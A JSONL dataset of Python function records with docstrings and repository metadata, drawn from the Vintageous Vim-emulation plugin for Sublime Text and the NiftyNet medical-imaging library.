{"docstring": "# Resets all temporary data needed to build a command or partial\n# command.\n", "func_signal": "def reset_command_data(self):\n", "code": "self.update_xpos()\nif self.must_scroll_into_view():\n    self.scroll_into_view()\n\nself.action and self.action.reset()\nself.action = None\nself.motion and self.motion.reset()\nself.motion = None\nself.action_count = ''\nself.motion_count = ''\n\nself.reset_sequence()\nself.reset_partial_sequence()\nself.reset_register_data()\nself.reset_status()", "path": "Vintageous/state.py", "commit_date": "2015-06-20 00:00:00", "repo_name": "guillermooo/Vintageous", "stars": 1639, "license": "other", "language": "python", "size": 3516}
{"docstring": "# Some commands gather user input through input panels. An input panel\n# is just a view, so when it's closed, the previous view gets\n# activated and Vintageous init code runs. In this case, however, we\n# most likely want the global state to remain unchanged. This variable\n# helps to signal this.\n#\n# For an example, see the '_vi_slash' command.\n", "func_signal": "def reset_during_init(self):\n", "code": "value = self.settings.window['_vintageous_reset_during_init']\nif not isinstance(value, bool):\n    return True\nreturn value", "path": "Vintageous/state.py", "commit_date": "2015-06-20 00:00:00", "repo_name": "guillermooo/Vintageous", "stars": 1639, "license": "other", "language": "python", "size": 3516}
{"docstring": "\"\"\"\nRun data as a command if possible.\n\"\"\"\n", "func_signal": "def eval(self):\n", "code": "if not self.runnable():\n    return\n\nif self.action and self.motion:\n    action_cmd = self.action.translate(self)\n    motion_cmd = self.motion.translate(self)\n    self.logger.info(\n        '[State] full command, switching to internal normal mode')\n    self.mode = modes.INTERNAL_NORMAL\n\n    # TODO: Make a requirement that motions and actions take a\n    # 'mode' param.\n    if 'mode' in action_cmd['action_args']:\n        action_cmd['action_args']['mode'] = modes.INTERNAL_NORMAL\n\n    if 'mode' in motion_cmd['motion_args']:\n        motion_cmd['motion_args']['mode'] = modes.INTERNAL_NORMAL\n\n    args = action_cmd['action_args']\n    args['count'] = 1\n    # let the action run the motion within its edit object so that\n    # we don't need to worry about grouping edits to the buffer.\n    args['motion'] = motion_cmd\n    self.logger.info(\n        '[Stage] motion in motion+action: {0}'.format(motion_cmd))\n\n    if self.glue_until_normal_mode and not self.processing_notation:\n        # We need to tell Sublime Text now that it should group\n        # all the next edits until we enter normal mode again.\n        sublime.active_window().run_command(\n            'mark_undo_groups_for_gluing')\n\n    self.add_macro_step(action_cmd['action'], args)\n\n    sublime.active_window().run_command(action_cmd['action'], args)\n    if not self.non_interactive:\n        if self.action.repeatable:\n            self.repeat_data = ('vi', str(self.sequence),\n                                self.mode, None)\n    self.reset_command_data()\n    return\n\nif self.motion:\n    motion_cmd = self.motion.translate(self)\n    self.logger.info(\n        '[State] lone motion cmd: {0}'.format(motion_cmd))\n\n    self.add_macro_step(motion_cmd['motion'],\n                        motion_cmd['motion_args'])\n\n    # We know that all motions are subclasses of ViTextCommandBase,\n    # so it's safe to call them from the current view.\n    self.view.run_command(motion_cmd['motion'],\n                          motion_cmd['motion_args'])\n\nif self.action:\n    action_cmd = self.action.translate(self)\n    self.logger.info('[Stage] lone action cmd '.format(action_cmd))\n    if self.mode == modes.NORMAL:\n        self.logger.info(\n            '[State] switching to internal normal mode')\n        self.mode = modes.INTERNAL_NORMAL\n\n        if 'mode' in action_cmd['action_args']:\n            action_cmd['action_args']['mode'] = \\\n                modes.INTERNAL_NORMAL\n    elif self.mode in (modes.VISUAL, modes.VISUAL_LINE):\n        self.view.add_regions('visual_sel', list(self.view.sel()))\n\n    # Some commands, like 'i' or 'a', open a series of edits that\n    # need to be grouped together unless we are gluing a larger\n    # sequence through ProcessNotation. For example, aFOOBAR<Esc> should\n    # be grouped atomically, but not inside a sequence like\n    # iXXX<Esc>llaYYY<Esc>, where we want to group the whole\n    # sequence instead.\n    if self.glue_until_normal_mode and not self.processing_notation:\n        sublime.active_window().run_command(\n            'mark_undo_groups_for_gluing')\n\n    seq = self.sequence\n    visual_repeat_data = self.get_visual_repeat_data()\n    action = self.action\n\n    self.add_macro_step(action_cmd['action'],\n                        action_cmd['action_args'])\n\n    sublime.active_window().run_command(action_cmd['action'],\n                                        action_cmd['action_args'])\n\n    if not (self.processing_notation and self.glue_until_normal_mode):\n        if action.repeatable:\n            self.repeat_data = ('vi', seq, self.mode,\n                                visual_repeat_data)\n\nself.logger.info(\n    'running command: action: {0} motion: {1}'.format(self.action,\n                                                      self.motion))\n\nif self.mode == modes.INTERNAL_NORMAL:\n    self.enter_normal_mode()\n\nself.reset_command_data()", "path": "Vintageous/state.py", "commit_date": "2015-06-20 00:00:00", "repo_name": "guillermooo/Vintageous", "stars": 1639, "license": "other", "language": "python", "size": 3516}
{"docstring": "\"\"\"\nProcesses input for this command.\n\"\"\"\n", "func_signal": "def accept(self, key):\n", "code": "_name = self.__class__.__name__\nassert self.input_parser, '{0} does not provide an input parser'.format(_name)\nraise NotImplementedError(\n        '{0} must implement .accept()'.format(_name))", "path": "Vintageous/vi/cmd_base.py", "commit_date": "2014-10-08 00:00:00", "repo_name": "guillermooo/Vintageous", "stars": 1639, "license": "other", "language": "python", "size": 3516}
{"docstring": "\"\"\"\nReturns `True` if the current parser needs to be run via a panel.\n\nIf needed, it runs the input-panel-based parser.\n\"\"\"\n", "func_signal": "def _run_parser_via_panel(self, command):\n", "code": "if command.input_parser.type == input_types.VIA_PANEL:\n    if self.non_interactive:\n        return False\n    sublime.active_window().run_command(command.input_parser.command)\n    return True\nreturn False", "path": "Vintageous/state.py", "commit_date": "2015-06-20 00:00:00", "repo_name": "guillermooo/Vintageous", "stars": 1639, "license": "other", "language": "python", "size": 3516}
{"docstring": "\"\"\"\nReturns `True` if we can run the state data as it is.\n\"\"\"\n", "func_signal": "def runnable(self):\n", "code": "if self.must_collect_input:\n    return False\n\nif self.action and self.motion:\n    if self.mode != modes.NORMAL:\n        raise ValueError('wrong mode')\n    return True\n\nif self.can_run_action():\n    if self.mode == modes.OPERATOR_PENDING:\n        raise ValueError('wrong mode')\n    return True\n\nif self.motion:\n    if self.mode == modes.OPERATOR_PENDING:\n        raise ValueError('wrong mode')\n    return True\n\nreturn False", "path": "Vintageous/state.py", "commit_date": "2015-06-20 00:00:00", "repo_name": "guillermooo/Vintageous", "stars": 1639, "license": "other", "language": "python", "size": 3516}
{"docstring": "\"\"\"\nCalculates the actual count for the current command.\n\"\"\"\n", "func_signal": "def count(self):\n", "code": "c = 1\n\nif self.action_count:\n    c = int(self.action_count) or 1\n\nif self.motion_count:\n    c *= (int(self.motion_count) or 1)\n\nif c < 1:\n    raise ValueError('count must be positive')\n\nreturn c", "path": "Vintageous/state.py", "commit_date": "2015-06-20 00:00:00", "repo_name": "guillermooo/Vintageous", "stars": 1639, "license": "other", "language": "python", "size": 3516}
{"docstring": "'''Replaces well-known variables in key names with their corresponding\nvalues.\n'''\n", "func_signal": "def expand_keys(seq):\n", "code": "leader = var_name = None\n# TODO(guillermooo): Can these variables appear in the middle of a\n# sequence instead of at the beginning only?\nif seq.lower().startswith('<leader>'):\n    var_name = '<leader>'\n    leader = _VARIABLES.get('mapleader', _DEFAULTS.get('mapleader'))\n\nif seq.lower().startswith('<localleader>'):\n    var = '<localleader>'\n    local_leader = _VARIABLES.get('maplocalleader',\n                        _DEFAULTS.get('maplocalleader'))\n\ntry:\n    return leader + seq[len(var_name):]\nexcept TypeError:\n    return seq", "path": "Vintageous/vi/variables.py", "commit_date": "2014-08-09 00:00:00", "repo_name": "guillermooo/Vintageous", "stars": 1639, "license": "other", "language": "python", "size": 3516}
{"docstring": "\"\"\"\nReturns `True` if state must collect input for the current motion or\noperator.\n\"\"\"\n", "func_signal": "def must_collect_input(self):\n", "code": "if self.motion and self.action:\n    if self.motion.accept_input:\n        return True\n\n    return (self.action.accept_input and\n            self.action.input_parser.type == input_types.AFTER_MOTION)\n\n# Special case: `q` should stop the macro recorder if it's running and\n# not request further input from the user.\nif (isinstance(self.action, cmd_defs.ViToggleMacroRecorder) and\n    self.is_recording):\n        return False\n\nif (self.action and\n    self.action.accept_input and\n    self.action.input_parser.type == input_types.INMEDIATE):\n        return True\n\nif self.motion:\n    return (self.motion and self.motion.accept_input)", "path": "Vintageous/state.py", "commit_date": "2015-06-20 00:00:00", "repo_name": "guillermooo/Vintageous", "stars": 1639, "license": "other", "language": "python", "size": 3516}
{"docstring": "\"\"\"\nInitializes global data. Runs at startup and every time a view gets\nactivated, loaded, etc.\n\n@new_session\n  Whether we're starting up Sublime Text. If so, volatile data must be\n  wiped.\n\"\"\"\n\n", "func_signal": "def _init_vintageous(view, new_session=False):\n", "code": "_logger.debug(\"running init for view %d\", view.id())\n\nif not is_view(view):\n    # Abort if we got a widget, panel...\n    _logger.info(\n        '[_init_vintageous] ignoring view: {0}'.format(\n            view.name() or view.file_name() or '<???>'))\n    try:\n        # XXX: All this seems to be necessary here.\n        if not is_ignored_but_command_mode(view):\n            view.settings().set('command_mode', False)\n            view.settings().set('inverse_caret_state', False)\n        view.settings().erase('vintage')\n        if is_ignored(view):\n            # Someone has intentionally disabled Vintageous, so let the user know.\n            sublime.status_message(\n                'Vintageous: Vim emulation disabled for the current view')\n    except AttributeError:\n        _logger.info(\n            '[_init_vintageous] probably received the console view')\n    except Exception:\n        _logger.error('[_init_vintageous] error initializing view')\n    finally:\n        return\n\nstate = State(view)\n\nif not state.reset_during_init:\n    # Probably exiting from an input panel, like when using '/'. Don't\n    # reset the global state, as it may contain data needed to complete\n    # the command that's being built.\n    state.reset_during_init = True\n    return\n\n# Non-standard user setting.\nreset = state.settings.view['vintageous_reset_mode_when_switching_tabs']\n# XXX: If the view was already in normal mode, we still need to run the\n# init code. I believe this is due to Sublime Text (intentionally) not\n# serializing the inverted caret state and the command_mode setting when\n# first loading a file.\n# If the mode is unknown, it might be a new file. Let normal mode setup\n# continue.\nif not reset and (state.mode not in (modes.NORMAL, modes.UNKNOWN)):\n    return\n\n# If we have no selections, add one.\nif len(state.view.sel()) == 0:\n    state.view.sel().add(sublime.Region(0))\n\nstate.logger.info('[_init_vintageous] running init')\n\nif state.mode in (modes.VISUAL, modes.VISUAL_LINE):\n    # TODO: Don't we need to pass a mode here?\n    view.window().run_command('_enter_normal_mode', {'from_init': True})\n\nelif state.mode in (modes.INSERT, modes.REPLACE):\n    # TODO: Don't we need to pass a mode here?\n    view.window().run_command('_enter_normal_mode', {'from_init': True})\n\nelif (view.has_non_empty_selection_region() and\n      state.mode != modes.VISUAL):\n        # Runs, for example, when we've performed a search via ST3 search\n        # panel and we've pressed 'Find All'. In this case, we want to\n        # ensure a consistent state for multiple selections.\n        # TODO: We could end up with multiple selections in other ways\n        #       that bypass _init_vintageous.\n        state.mode = modes.VISUAL\n\nelse:\n    # This may be run when we're coming from cmdline mode.\n    pseudo_visual = view.has_non_empty_selection_region()\n    mode = modes.VISUAL if pseudo_visual else state.mode\n    # TODO: Maybe the above should be handled by State?\n    state.enter_normal_mode()\n    view.window().run_command('_enter_normal_mode', {'mode': mode,\n                                                     'from_init': True})\n\nstate.reset_command_data()\nif new_session:\n    state.reset_volatile_data()\n\n    # Load settings.\n    DotFile.from_user().run()", "path": "Vintageous/state.py", "commit_date": "2015-06-20 00:00:00", "repo_name": "guillermooo/Vintageous", "stars": 1639, "license": "other", "language": "python", "size": 3516}
{"docstring": "\"\"\"\nSets the current command to @command.\n\n@command\n  A command definition as found in `keys.py`.\n\"\"\"\n", "func_signal": "def set_command(self, command):\n", "code": "assert isinstance(command, cmd_base.ViCommandDefBase), \\\n    'ViCommandDefBase expected, got {0}'.format(type(command))\n\nif isinstance(command, cmd_base.ViMotionDef):\n    if self.runnable():\n        # We already have a motion, so this looks like an error.\n        raise ValueError('too many motions')\n    self.motion = command\n\n    if self.mode == modes.OPERATOR_PENDING:\n        self.mode = modes.NORMAL\n\n    if self._set_parsers(command):\n        return\n\nelif isinstance(command, cmd_base.ViOperatorDef):\n    if self.runnable():\n        # We already have an action, so this looks like an error.\n        raise ValueError('too many actions')\n    self.action = command\n\n    if (self.action.motion_required and\n        not self.in_any_visual_mode()):\n            self.mode = modes.OPERATOR_PENDING\n\n    if self._set_parsers(command):\n        return\n\nelse:\n    self.logger.info(\"[State] command: {0}\".format(command))\n    raise ValueError('unexpected command type')", "path": "Vintageous/state.py", "commit_date": "2015-06-20 00:00:00", "repo_name": "guillermooo/Vintageous", "stars": 1639, "license": "other", "language": "python", "size": 3516}
{"docstring": "'''\nDisplays a message.\n\n@message\n  The message's message.\n\n@displays\n  A `Display` where the message should be output to.\n'''\n", "func_signal": "def show_message(message, displays=Display.CONSOLE):\n", "code": "message = 'Vintageous: {}'.format(message)\n\nif displays == Display.NONE:\n    return\n\nif (displays & Display.CONSOLE) == Display.CONSOLE:\n    print(message)\n\nif (displays & Display.STATUS) == Display.STATUS:\n    sublime.status_message(message)", "path": "Vintageous/ex/ex_error.py", "commit_date": "2015-04-17 00:00:00", "repo_name": "guillermooo/Vintageous", "stars": 1639, "license": "other", "language": "python", "size": 3516}
{"docstring": "\"\"\"\nInstantiates a command from a valid Json object representing one.\n\n@data\n  Serialized command data as provided by .serialize().\n\"\"\"\n", "func_signal": "def from_json(cls, data):\n", "code": "instance = cls()\ninstance.__dict__.update(data)\nreturn instance", "path": "Vintageous/vi/cmd_base.py", "commit_date": "2014-10-08 00:00:00", "repo_name": "guillermooo/Vintageous", "stars": 1639, "license": "other", "language": "python", "size": 3516}
{"docstring": "\"\"\"\nReturns a valid Json object representing this command in a format\nVintageous uses internally.\n\"\"\"\n", "func_signal": "def serialize(self):\n", "code": "data = {'name': self.__class__.__name__,\n        'data': {k: v for k, v in self.__dict__.items()\n                      if k in self._serializable}\n        }\nreturn data", "path": "Vintageous/vi/cmd_base.py", "commit_date": "2014-10-08 00:00:00", "repo_name": "guillermooo/Vintageous", "stars": 1639, "license": "other", "language": "python", "size": 3516}
{"docstring": "\"\"\"\nReturns `True` if we've had to run an immediate parser via an input\npanel.\n\"\"\"\n", "func_signal": "def _set_parsers(self, command):\n", "code": "if command.accept_input:\n    return self._run_parser_via_panel(command)", "path": "Vintageous/state.py", "commit_date": "2015-06-20 00:00:00", "repo_name": "guillermooo/Vintageous", "stars": 1639, "license": "other", "language": "python", "size": 3516}
{"docstring": "\"\"\"\n',' and ';' change directions depending on which of 'f' or 't' was the\nprevious command.\n\nReturns the name of the last character search command, namely:\n'vi_f', 'vi_t', 'vi_big_f' or 'vi_big_t'.\n\"\"\"\n", "func_signal": "def last_char_search_command(self):\n", "code": "name = self.settings.window['_vintageous_last_char_search_command']\nreturn name or 'vi_f'", "path": "Vintageous/state.py", "commit_date": "2015-06-20 00:00:00", "repo_name": "guillermooo/Vintageous", "stars": 1639, "license": "other", "language": "python", "size": 3516}
{"docstring": "\"\"\"\n'n' and 'N' change directions depending on which of '/' or '?' was the\nprevious command.\n\nReturns the name of the last character search command, namely:\n'vi_slash', 'vi_question_mark', 'vi_star', 'vi_octothorp'\n\"\"\"\n", "func_signal": "def last_buffer_search_command(self):\n", "code": "name = self.settings.window['_vintageous_last_buffer_search_command']\nreturn name or 'vi_slash'", "path": "Vintageous/state.py", "commit_date": "2015-06-20 00:00:00", "repo_name": "guillermooo/Vintageous", "stars": 1639, "license": "other", "language": "python", "size": 3516}
{"docstring": "\"\"\"\nResets window- or application-wide data to their default values when\nstarting a new Vintageous session.\n\"\"\"\n", "func_signal": "def reset_volatile_data(self):\n", "code": "self.glue_until_normal_mode = False\nself.view.run_command('unmark_undo_groups_for_gluing')\nself.processing_notation = False\nself.non_interactive = False\nself.reset_during_init = True", "path": "Vintageous/state.py", "commit_date": "2015-06-20 00:00:00", "repo_name": "guillermooo/Vintageous", "stars": 1639, "license": "other", "language": "python", "size": 3516}
{"docstring": "\"\"\"Returns the data needed to restore visual selections before\nrepeating a visual mode command in normal mode.\n\"\"\"\n", "func_signal": "def get_visual_repeat_data(self):\n", "code": "if self.mode not in (modes.VISUAL, modes.VISUAL_LINE):\n    return\n\nfirst = first_sel(self.view)\nlines = (utils.row_at(self.view, first.end()) -\n         utils.row_at(self.view, first.begin()))\n\nif lines > 0:\n    chars = utils.col_at(self.view, first.end())\nelse:\n    chars = first.size()\n\nreturn (lines, chars, self.mode)", "path": "Vintageous/state.py", "commit_date": "2015-06-20 00:00:00", "repo_name": "guillermooo/Vintageous", "stars": 1639, "license": "other", "language": "python", "size": 3516}
{"docstring": "'''\nDisplays error messages to the user.\n\n@error\n  An instance of Exception.\n\n@displays\n  Where to output the message to.\n'''\n", "func_signal": "def show_error(error, displays=Display.ALL, log=False):\n", "code": "assert isinstance(error, Exception), \"'error' must be an instance of 'Exception'\"\nshow_message(str(error), displays=displays)", "path": "Vintageous/ex/ex_error.py", "commit_date": "2015-04-17 00:00:00", "repo_name": "guillermooo/Vintageous", "stars": 1639, "license": "other", "language": "python", "size": 3516}
{"docstring": "\"\"\"\nCalculates an edit distance, for typo detection. Code based on :\nhttps://en.wikipedia.org/wiki/Damerau\u2013Levenshtein_distance\n\"\"\"\n", "func_signal": "def damerau_levenshtein_distance(s1, s2):\n", "code": "d = {}\nstring_1_length = len(s1)\nstring_2_length = len(s2)\nfor i in range(-1, string_1_length + 1):\n    d[(i, -1)] = i + 1\nfor j in range(-1, string_2_length + 1):\n    d[(-1, j)] = j + 1\n\nfor i in range(string_1_length):\n    for j in range(string_2_length):\n        if s1[i] == s2[j]:\n            cost = 0\n        else:\n            cost = 1\n        d[(i, j)] = min(\n            d[(i - 1, j)] + 1,  # deletion\n            d[(i, j - 1)] + 1,  # insertion\n            d[(i - 1, j - 1)] + cost,  # substitution\n        )\n        if i and j and s1[i] == s2[j - 1] and s1[i - 1] == s2[j]:\n            d[(i, j)] = min(d[(i, j)],\n                            d[i - 2, j - 2] + cost)  # transposition\n\nreturn d[string_1_length - 1, string_2_length - 1]", "path": "NiftyNet/niftynet/utilities/util_common.py", "commit_date": "2019-01-31 00:00:00", "repo_name": "NifTK/NiftyNet", "stars": 1355, "license": "apache-2.0", "language": "python", "size": 11529}
{"docstring": "'''\ndefine the 2.5 d reader\n:return:\n'''\n", "func_signal": "def get_25d_reader():\n", "code": "reader = ImageReader(['image'])\nreader.initialise(SINGLE_25D_DATA, SINGLE_25D_TASK, single_25d_list)\nreturn reader", "path": "NiftyNet/tests/windows_aggregator_identity_v2_test.py", "commit_date": "2019-08-09 00:00:00", "repo_name": "NifTK/NiftyNet", "stars": 1355, "license": "apache-2.0", "language": "python", "size": 11529}
{"docstring": "'''\ndefine the label reader\n:return: label reader\n'''\n", "func_signal": "def get_label_reader():\n", "code": "reader = ImageReader(['label'])\nreader.initialise(MOD_LABEL_DATA, MOD_LABEl_TASK, mod_label_list)\nlabel_normaliser = DiscreteLabelNormalisationLayer(\n    image_name='label',\n    modalities=vars(SINGLE_25D_TASK).get('label'),\n    model_filename=os.path.join('testing_data', 'agg_test.txt'))\nreader.add_preprocessing_layers(label_normaliser)\npad_layer = PadLayer(image_name=('label',), border=(5, 6, 7))\nreader.add_preprocessing_layers([pad_layer])\nreturn reader", "path": "NiftyNet/tests/windows_aggregator_identity_v2_test.py", "commit_date": "2019-08-09 00:00:00", "repo_name": "NifTK/NiftyNet", "stars": 1355, "license": "apache-2.0", "language": "python", "size": 11529}
{"docstring": "\"\"\"\n\n:param n_output_chns: int, number of output channels\n:param stride: int, stride to use in the convolutional layers\n:param Conv: layer, convolutional layer\n:param name: layer name\n\"\"\"\n", "func_signal": "def __init__(self, n_output_chns, stride, Conv, name='bottleneck'):\n", "code": "self.n_output_chns = n_output_chns\nself.stride = stride\nself.bottle_neck_chns = n_output_chns // 4\nself.Conv = Conv\nsuper(BottleneckBlock, self).__init__(name=name)", "path": "NiftyNet/niftynet/network/resnet.py", "commit_date": "2019-12-18 00:00:00", "repo_name": "NifTK/NiftyNet", "stars": 1355, "license": "apache-2.0", "language": "python", "size": 11529}
{"docstring": "\"\"\"\nThis function averages the gradients generated by each optimiser\n\"\"\"\n", "func_signal": "def average_multi_opt_gradients(multi_device_gradients):\n", "code": "if not multi_device_gradients:\n    # nothing to average\n    return multi_device_gradients\n\nif isinstance(multi_device_gradients[0], dict):\n    # multi_device_gradients is a list of N dictionaries, for N devices\n    # each dictionary is a pair of optimiser_name: device_gradient\n    optimiser_names = sorted(multi_device_gradients[0])\n    ave_gradients = dict()\n    for opt_name in optimiser_names:\n        multi_device_grad = [device_gradient.get(opt_name)\n                             for device_gradient in multi_device_gradients]\n        ave_gradients[opt_name] = average_gradients(multi_device_grad)\n    return ave_gradients\n# multi_device_gradients is a list of N device_gradients, for N devices\nreturn average_gradients(multi_device_gradients)", "path": "NiftyNet/niftynet/utilities/util_common.py", "commit_date": "2019-01-31 00:00:00", "repo_name": "NifTK/NiftyNet", "stars": 1355, "license": "apache-2.0", "language": "python", "size": 11529}
{"docstring": "\"\"\"\nCheck if all input params have been properly set in the configuration file.\n:param input_args:\n:return:\n\"\"\"\n", "func_signal": "def has_bad_inputs(input_args):\n", "code": "is_bad = False\nfor section in input_args:\n    section_args = input_args[section]\n    for input_arg in vars(section_args):\n        user_value = getattr(section_args, input_arg)\n        if user_value is None:\n            print('{} not set in section [{}] the config file'.format(\n                input_arg, section))\n            is_bad = True\n\nreturn is_bad", "path": "NiftyNet/niftynet/utilities/util_common.py", "commit_date": "2019-01-31 00:00:00", "repo_name": "NifTK/NiftyNet", "stars": 1355, "license": "apache-2.0", "language": "python", "size": 11529}
{"docstring": "\"\"\"\n\n:return: tuple with batch norm layer, fully connected layer, first conv layer and all residual blocks\n\"\"\"\n", "func_signal": "def create(self):\n", "code": "bn = BNLayer()\nfc = FCLayer(self.num_classes)\nconv1 = self.Conv(self.n_features[0],\n                  acti_func=None,\n                  feature_normalization=None)\nblocks = []\nblocks += [\n    DownResBlock(self.n_features[1], self.n_blocks_per_resolution, 1,\n                 self.Conv)\n]\nfor n in self.n_features[2:]:\n    blocks += [\n        DownResBlock(n, self.n_blocks_per_resolution, 2, self.Conv)\n    ]\nreturn ResNetDesc(bn=bn, fc=fc, conv1=conv1, blocks=blocks)", "path": "NiftyNet/niftynet/network/resnet.py", "commit_date": "2019-12-18 00:00:00", "repo_name": "NifTK/NiftyNet", "stars": 1355, "license": "apache-2.0", "language": "python", "size": 11529}
{"docstring": "'''\ndefine the 2.5 d reader\n:return:\n'''\n", "func_signal": "def get_25d_reader():\n", "code": "reader = ImageReader(['image'])\nreader.initialise(SINGLE_25D_DATA, SINGLE_25D_TASK, single_25d_list)\nreturn reader", "path": "NiftyNet/tests/windows_aggregator_resize_v2_test.py", "commit_date": "2019-08-09 00:00:00", "repo_name": "NifTK/NiftyNet", "stars": 1355, "license": "apache-2.0", "language": "python", "size": 11529}
{"docstring": "'''\ndefine the 3d reader\n:return: 3d reader\n'''\n", "func_signal": "def get_3d_reader():\n", "code": "reader = ImageReader(['image'])\nreader.initialise(MULTI_MOD_DATA, MULTI_MOD_TASK, multi_mod_list)\nreturn reader", "path": "NiftyNet/tests/windows_aggregator_resize_v2_test.py", "commit_date": "2019-08-09 00:00:00", "repo_name": "NifTK/NiftyNet", "stars": 1355, "license": "apache-2.0", "language": "python", "size": 11529}
{"docstring": "\"\"\"\n\n:param images: tensor, input to the DownRes block\n:param is_training: is_training: boolean, True if network is in training mode\n:return: tensor, output of the DownRes block\n\"\"\"\n", "func_signal": "def layer_op(self, images, is_training):\n", "code": "layers = self.create()\nout = images\nfor l in layers.blocks:\n    out = l(out, is_training)\nreturn out", "path": "NiftyNet/niftynet/network/resnet.py", "commit_date": "2019-12-18 00:00:00", "repo_name": "NifTK/NiftyNet", "stars": 1355, "license": "apache-2.0", "language": "python", "size": 11529}
{"docstring": "\"\"\"\nthe input gradients are grouped by device,\nthis function average the gradients of multiple devices\n\n:param multi_device_gradients: list of N gradients for N devices\n:return:\n\"\"\"\n# print(len(multi_device_gradients),\n#   len(multi_device_gradients[0]),\n#   len(multi_device_gradients[0][0]),\n#   len(multi_device_gradients[0][0][0]))\n\n", "func_signal": "def average_gradients(multi_device_gradients):\n", "code": "if len(multi_device_gradients) == 1:\n    # only one device, so we get rid of the first level list\n    # that loops over devices\n    return multi_device_gradients[0]\n\nnested_grads_depth = list_depth_count(multi_device_gradients)\nif nested_grads_depth == 4:\n    gradients = zip(*multi_device_gradients)\n    averaged_grads = [__average_grads(g) for g in gradients]\nelif nested_grads_depth == 3:\n    averaged_grads = __average_grads(multi_device_gradients)\nelse:\n    tf.logging.fatal(\n        \"The list of gradients are nested in an unusual way.\"\n        \"application's gradient is not compatible with app driver.\"\n        \"Please check the return value of gradients_collector \"\n        \"in connect_data_and_network() of the application\")\n    raise RuntimeError\nreturn averaged_grads", "path": "NiftyNet/niftynet/utilities/util_common.py", "commit_date": "2019-01-31 00:00:00", "repo_name": "NifTK/NiftyNet", "stars": 1355, "license": "apache-2.0", "language": "python", "size": 11529}
{"docstring": "\"\"\"\n\n:param images: tensor, input to the network\n:param is_training: boolean, True if network is in training mode\n:param unused_kwargs: not in use\n:return: tensor, output of the final fully connected layer\n\"\"\"\n", "func_signal": "def layer_op(self, images, is_training=True, **unused_kwargs):\n", "code": "layers = self.create()\nout = layers.conv1(images, is_training)\nfor block in layers.blocks:\n    out = block(out, is_training)\n\nspatial_rank = layer_util.infer_spatial_rank(out)\naxis_to_avg = [dim + 1 for dim in range(spatial_rank)]\nout = tf.reduce_mean(tf.nn.relu(layers.bn(out, is_training)),\n                     axis=axis_to_avg)\nreturn layers.fc(out)", "path": "NiftyNet/niftynet/network/resnet.py", "commit_date": "2019-12-18 00:00:00", "repo_name": "NifTK/NiftyNet", "stars": 1355, "license": "apache-2.0", "language": "python", "size": 11529}
{"docstring": "\"\"\"\nThis function validates the ``type_str`` against the supported set.\n\nif ``supported`` is a ``set``, returns ``type_str``\nif ``supported`` is a ``dict``, return ``supported[type_str]``\nelse:\nraise an error possibly with a guess of the closest match.\n\n:param type_str:\n:param supported:\n:return:\n\"\"\"\n", "func_signal": "def look_up_operations(type_str, supported):\n", "code": "assert isinstance(type_str, string_types), 'unrecognised type string'\nif isinstance(supported, dict) and type_str in supported:\n    return supported[type_str]\n\nif isinstance(supported, set) and type_str in supported:\n    return type_str\n\ntry:\n    set_to_check = set(supported)\nexcept TypeError:\n    set_to_check = set()\n\nedit_distances = {}\nfor supported_key in set_to_check:\n    edit_distance = damerau_levenshtein_distance(supported_key,\n                                                 type_str)\n    if edit_distance <= 3:\n        edit_distances[supported_key] = edit_distance\nif edit_distances:\n    guess_at_correct_spelling = min(edit_distances,\n                                    key=edit_distances.get)\n    raise ValueError('By \"{0}\", did you mean \"{1}\"?\\n'\n                     '\"{0}\" is not a valid option.\\n'\n                     'Available options are {2}\\n'.format(\n                         type_str, guess_at_correct_spelling, supported))\nelse:\n    raise ValueError(\"No supported option \\\"{}\\\" \"\n                     \"is not found.\\nAvailable options are {}\\n\".format(\n                         type_str, supported))", "path": "NiftyNet/niftynet/utilities/util_common.py", "commit_date": "2019-01-31 00:00:00", "repo_name": "NifTK/NiftyNet", "stars": 1355, "license": "apache-2.0", "language": "python", "size": 11529}
{"docstring": "\"\"\"\nCreates the border for a 3D image\n:return:\n\"\"\"\n", "func_signal": "def border_map(self):\n", "code": "west = ndimage.shift(self.binary_map, [-1, 0, 0], order=0)\neast = ndimage.shift(self.binary_map, [1, 0, 0], order=0)\nnorth = ndimage.shift(self.binary_map, [0, 1, 0], order=0)\nsouth = ndimage.shift(self.binary_map, [0, -1, 0], order=0)\ntop = ndimage.shift(self.binary_map, [0, 0, 1], order=0)\nbottom = ndimage.shift(self.binary_map, [0, 0, -1], order=0)\ncumulative = west + east + north + south + top + bottom\nborder = ((cumulative < 6) * self.binary_map) == 1\nreturn border", "path": "NiftyNet/niftynet/utilities/util_common.py", "commit_date": "2019-01-31 00:00:00", "repo_name": "NifTK/NiftyNet", "stars": 1355, "license": "apache-2.0", "language": "python", "size": 11529}
{"docstring": "\"\"\"\nassigning CPU/GPU based on user specifications\n\"\"\"\n# pylint: disable=no-name-in-module\n", "func_signal": "def device_string(n_devices=0, device_id=0, is_worker=True, is_training=True):\n", "code": "from tensorflow.python.client import device_lib\ndevices = device_lib.list_local_devices()\nn_local_gpus = sum([x.device_type == 'GPU' for x in devices])\nif n_devices <= 0:  # user specified no gpu at all\n    return '/cpu:{}'.format(device_id)\nif is_training:\n    # in training: use gpu only for workers whenever n_local_gpus\n    device = 'gpu' if (is_worker and n_local_gpus > 0) else 'cpu'\n    if device == 'gpu' and device_id >= n_local_gpus:\n        tf.logging.warning(\n            'trying to use gpu id %s, but only has %s GPU(s), '\n            'please set num_gpus to %s at most',\n            device_id, n_local_gpus, n_local_gpus)\n        # raise ValueError\n    return '/{}:{}'.format(device, device_id)\n# in inference: use gpu for everything whenever n_local_gpus\nreturn '/gpu:0' if n_local_gpus > 0 else '/cpu:0'", "path": "NiftyNet/niftynet/utilities/util_common.py", "commit_date": "2019-01-31 00:00:00", "repo_name": "NifTK/NiftyNet", "stars": 1355, "license": "apache-2.0", "language": "python", "size": 11529}
{"docstring": "'''\ndefine the label reader\n:return: label reader\n'''\n", "func_signal": "def get_label_reader():\n", "code": "reader = ImageReader(['label'])\nreader.initialise(MOD_LABEL_DATA, MOD_LABEl_TASK, mod_label_list)\nlabel_normaliser = DiscreteLabelNormalisationLayer(\n    image_name='label',\n    modalities=vars(SINGLE_25D_TASK).get('label'),\n    model_filename=os.path.join('testing_data', 'agg_test.txt'))\nreader.add_preprocessing_layers(label_normaliser)\npad_layer = PadLayer(image_name=('label', ), border=(5, 6, 7))\nreader.add_preprocessing_layers([pad_layer])\nreturn reader", "path": "NiftyNet/tests/windows_aggregator_resize_v2_test.py", "commit_date": "2019-08-09 00:00:00", "repo_name": "NifTK/NiftyNet", "stars": 1355, "license": "apache-2.0", "language": "python", "size": 11529}
